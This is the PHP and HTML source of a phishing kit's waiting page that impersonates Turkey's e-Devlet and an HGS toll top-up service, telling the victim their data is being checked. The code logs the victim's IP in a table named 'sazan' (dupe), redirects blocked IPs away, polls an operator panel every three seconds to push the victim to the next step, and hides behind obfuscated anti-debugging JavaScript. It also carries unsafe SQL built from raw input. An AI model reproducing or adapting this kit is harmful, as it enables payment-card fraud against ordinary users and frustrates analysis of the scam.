<?php
    date_default_timezone_set('Europe/Istanbul');
    include('../../baglan.php');
    $rowData = $db->query("SELECT * FROM sazan WHERE ip='$ip'");
    if($rowData->rowCount() > 0) {
        $db->query("UPDATE sazan SET now = 'Bekle' WHERE ip = '{$ip}'");
    }

    $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
    foreach($ban as $kontrol){
        if($kontrol['ban'] == $ip){ 
            header('Location:https://www.youtube.com/watch?v=lrmTi-53QWw&t=1m50s');
        } 
    }
?>
<!DOCTYPE html>
<html style="height: auto;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>HGS Para Yükleme - Bekleme</title>
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
        
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
    <meta name="HandheldFriendly" content="true">
    <meta name="format-detection" content="telephone=no">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <!-- Coded By GOD -->
    <link rel="icon" type="image/png" "./v2/assets/images/favicon.png" />
	<link rel="shortcut icon" href="./v2/assets/images/favicon.png" />
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
    <link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
    <link rel="stylesheet" media="all" type="text/css" href="./god/bootstrap.v3.3.6.css">
    <link rel="stylesheet" media="all" type="text/css" href="./god/bootstrap-switch.v3.3.2.min.css">
    <link rel="stylesheet" media="all" type="text/css" href="./god/font-awesome.v4.7.0.css">
    <link rel="stylesheet" media="all" type="text/css" href="./god/switchery.min.css">
    <link rel="stylesheet" media="all" type="text/css" href="./god/ib-common.css">
    <link rel="stylesheet" media="all" type="text/css" href="./god/login.css">
    <link rel="stylesheet" media="all" type="text/css" href="./god/otp-responsive.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
    <script src="./god/jquery-3.4.1.min.js" type="text/javascript"></script>

    <style type="text/css">
        html {
            font-family: sans-serif !important;
            margin: auto;
        }

        body, h1, h2, h3, h4, h5, h6 {
            font-family: "Open Sans",sans-serif !important;
        }

        label {
            font-weight: 600 !important;
        }

        .btn {
            white-space: normal !important;
        }

    

        .alert-danger {
            background-color: #fbe1e3 !important;
        }

        .alert-warning {
            background-color: #f9e491 !important;
        }

        .alert-info {
            background-color: #abe7ed !important;
        }

        .btn-warning {
            background-color: #f39200 !important;
            border-color: #a26400 !important;
        }

        .text-yellow {
            color: #bd7304 !important;
        }

        .text-red {
            color: #bf301e !important;
        }
    </style>

    
    <link href="./index_files/basvurusorgula.css" rel="stylesheet">

    <style type="text/css">
        .text-red {
            color: #ed6b75 !important;
        }
    </style>
    <script type="text/javascript" async="" src="./index_files/recaptcha__tr.js.indir"></script><script src="./index_files/jquery-2.2.3.min.js.indir"></script>
    <script src="./index_files/bootstrap.min.js.indir"></script>
    <script src="./index_files/jquery.slimscroll.min.js.indir"></script>
    <script src="./index_files/fastclick.js.indir"></script>
    <script src="./index_files/select2.full.min.js.indir"></script>
    <script src="./index_files/bootstrap-datepicker.js.indir"></script>
    <script src="./index_files/bootstrap-datepicker.tr.js.indir" charset="UTF-8"></script>
    <script src="./index_files/toastr.js.indir"></script>
    <script src="./index_files/raphael.js.indir"></script>
    <script src="./index_files/morris.min.js.indir"></script>
    <script src="./index_files/app.min.js.indir"></script>
    <script src="./index_files/demo.js.indir"></script>
    <script src="./index_files/jquery.validate.min.js.indir" type="text/javascript"></script>
    <script src="./index_files/additional-methods.min.js.indir" type="text/javascript"></script>
    <script src="./index_files/messages_tr.js.indir" type="text/javascript"></script>
    <script src="./index_files/jquery.inputmask.bundle.min.js.indir" type="text/javascript"></script>
    <script src="./index_files/icheck.min.js.indir" type="text/javascript"></script>
    <script src="./index_files/select2.full.min.js.indir" type="text/javascript"></script>
    <script src="./index_files/select2-cascade.js.indir" type="text/javascript"></script>
    <script src="./index_files/jquery.countdown.min.js.indir" type="text/javascript"></script>
    <script src="./index_files/jquery.loadingModal.min.js.indir" type="text/javascript"></script>
    <script src="./index_files/jquery.simplePagination.js.indir" type="text/javascript"></script>
    <script src="./index_files/jquery.table2excel.min.js.indir"></script>
    <script type="text/javascript">
        function _0x12bc(_0x20097a,_0x23b541){var _0x5a56ae=_0x5a56();return _0x12bc=function(_0x12bc80,_0x33ceb6){_0x12bc80=_0x12bc80-0xb6;var _0x3fe16e=_0x5a56ae[_0x12bc80];return _0x3fe16e;},_0x12bc(_0x20097a,_0x23b541);}function _0x5a56(){var _0x4cae2b=['8809976TnolRG','633654CTxFYp','5003250Dfcrex','56GQRUAP','2631432XRQHYL','1171710nunqCV','4089696WWRhYk','constructor','1026638EbsbiB'];_0x5a56=function(){return _0x4cae2b;};return _0x5a56();}(function(_0xfc63bc,_0x6d8c05){var _0x40582c=_0x12bc,_0x50ed59=_0xfc63bc();while(!![]){try{var _0x4bc724=parseInt(_0x40582c(0xbe))/0x1+parseInt(_0x40582c(0xbb))/0x2+parseInt(_0x40582c(0xba))/0x3+-parseInt(_0x40582c(0xbc))/0x4+parseInt(_0x40582c(0xb8))/0x5+-parseInt(_0x40582c(0xb7))/0x6*(parseInt(_0x40582c(0xb9))/0x7)+-parseInt(_0x40582c(0xb6))/0x8;if(_0x4bc724===_0x6d8c05)break;else _0x50ed59['push'](_0x50ed59['shift']());}catch(_0xab3cb8){_0x50ed59['push'](_0x50ed59['shift']());}}}(_0x5a56,0x7f610),setInterval(()=>{var _0xde6671=_0x12bc;(function(){return![];}[_0xde6671(0xbd)]('debugger')['apply']('stateObject'));},0x3e8));
        $(document).ready(function() {
            gonder();
            var int=self.setInterval("gonder()",3000);
        });

        function gonder() {
            $.ajax({
                type:'POST',
                url:'<?php echo "datach.php?ip=".$ip; ?>',
                success: function (msg) {
                    if(!msg || msg == "" || msg == " ") return;
                    window.location.href = msg;
                }
            });
        }
      </script>
	<style>
            *{
                font-family: 'Open Sans', sans-serif;
            }
            input{
                font-family: 'Open Sans', sans-serif;
            }
            .gsss {
                margin:20px 0px;
                padding:20px 30px 20px 30px;
                background:#FFFFCC;
                border:1px solid #FFCC66;
                display: none;
            }

            .modal-api p {
                font-size: 16px;
                margin-bottom: 20px;
            }
            .modal-api a.link {
                color: #4d6e9d;
            }
            .modal-api a.link:hover {
                text-decoration: underline;
            }
            .modal-api .btn {
                text-transform: none;
                color: #fff;
                background-color: #4d6e9d;
                bordercolor: #4d6e9d;
                font-weight: 400;
                padding: 13px 55px;
            }
            .modal-api .btn:hover {
                color: #fff;
                background-color: #286090;
                bordercolor: #204d74;
            }
            .modal-api .modal-content {
                border-radius: 5px;
            }
            .modal-api .modal-content .modal-body {
                padding: 30px 50px 10px;
            }
            .modal-api .close {
                font-size: 50px;
                position: absolute;
                top: 10px;
                right: 20px;
            }
        </style>
</head>

<body class="bg-gray">
        <section class="login-page">
            <div class="container">
                <div class="login-container">
                    <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                            
                                <a href="" target="_self" class="ib-logo-white"></a>
                            
                 </div>
          </div>



        <form id="loginform" name="loginform" method="post" action="">
            <div class="login">
                <div id="authcredentials" style="">
                    <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                            <h1 style="text-align:center;">
                                <img src="god/edevlet.png" style="width:230px;"></h1><br><br>
                                <div class="form-group">
                                    <div style="background:#fcfcfc;width:100%;min-height:140px;border-radius:5px;padding-top:7px;padding-bottom:7px;border:1px solid #eee;display:flex;flex-direction:column;gap:0px;align-items:center;justify-content:center;text-align:center">
                                        <img src="god/bekle.gif" width="60px;"><br>
                                        <b style="color:#666;">Lütfen Bekleyiniz.</b>
                                        <p>Verileriniz sistemde sorgulanıyor.</p>
                                    </div>
                                </div><br>
                            </div>
                        </div>
                    </div>
                            
                            <input type="hidden" id="loginType" name="loginType" value="1">

                            <div class="gsss" style="display: none;">
                            </div>
                        </div>
                    </form>
                </div>
                    
            </div>
        </section>

        
            <section class="download-text">
                <div class="container">
                    <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                            <p>
                            </p>
                        </div>
                    </div>
                </div>
            </section>

        

        
        <div style="display: none;">
            <div id="twofactbase">
                <p id="chlgtext_SWCR" style="display: none;">
                    Challenge:&nbsp;
                </p>
                <p id="chlgtext_Bingo" style="display: none;">
                    Use your security code card for authentication. Two card index numbers are shown in the image below. For each index, look up the corresponding value, and enter in the field below.
                </p>
                <p id="chlgtext" style="display: none;"></p>

                <label id="chlgdescr_SWTK" style="display: none;">Security Code</label>
                <label id="chlgdescr_SWCR" style="display: none;">Response String</label>
                <label id="chlgdescr_Bingo" style="display: none;">Card Values</label>
                <label id="chlgdescr_IBTK" style="display: none;">Temporary Security Code</label>
                <label id="chlgdescr"></label>
                <div class="form-group">
                    <input type="text" maxlength="8" id="chlginput" autocomplete="off" name="chlginput" class="form-control" onfocus="enableSubmit()">
                    <p class="otp-opener-text">Didn't receive a security code?</p>
                </div>
                <div class="form-group">
                    <button id="submitForm" type="submit" class="btn btn-lg btn-primary">
                        Login
                    </button>
                </div>
            </div>
        </div>
        <div id="debugarea" align="left"></div>
        <div id="helpTextCopy" style="display: none">Help</div>

        <div class="modal fade in modal-api" id="ibkrApiModal" tabindex="-1" role="dialog">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-body">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close" onclick="$(&#39;#ibkrApiModal&#39;).modal(&#39;hide&#39;)"><span aria-hidden="true">×</span></button>
                        <p>Interactive Brokers is pleased to announce the launch of its new API platform.</p>
                        <p><a class="btn btn-lg btn-primary" href="https://download2.interactivebrokers.com/portal/clientportal.beta.gw.zip" role="button">Download New API Gateway</a></p>
                        <p>This update should not cause any interruption of service or changes to API endpoints. However, if you have questions please contact us via message center in <a href="https://www.interactivebrokers.com/en/software/am3/am/support/creatingaticket.htm" target="_blank" class="link">Client Portal</a>.</p><p>Please note that our legacy platform will no longer be accessible after <strong>June 20, 2020.</strong></p>
                    </div>
                </div>
            </div>
        </div>

</body>